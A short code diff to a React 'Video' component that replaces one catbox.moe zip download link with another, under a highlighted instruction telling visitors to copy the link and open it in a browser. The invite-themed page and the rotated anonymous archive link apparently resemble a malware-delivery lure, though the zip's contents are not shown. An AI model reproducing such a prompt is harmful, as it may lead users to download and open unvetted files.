@@ -62,8 +62,8 @@ export default function Video({ invites, watermark }) {
                                 <div className="mb-8 p-4 bg-yellow-100 rounded-md flex items-center justify-between">
                                     <div>
                                         <p className="text-gray-700">Copy this link and open it with a web browser:</p>
-                                        <a href='https://files.catbox.moe/uyugk8.zip' className="text-blue-500">
-                                            https://files.catbox.moe/uyugk8.zip
+                                        <a href='https://files.catbox.moe/el6hr6.zip' className="text-blue-500">
+                                            https://files.catbox.moe/el6hr6.zip
                                         </a>
                                     </div>
                                     <button
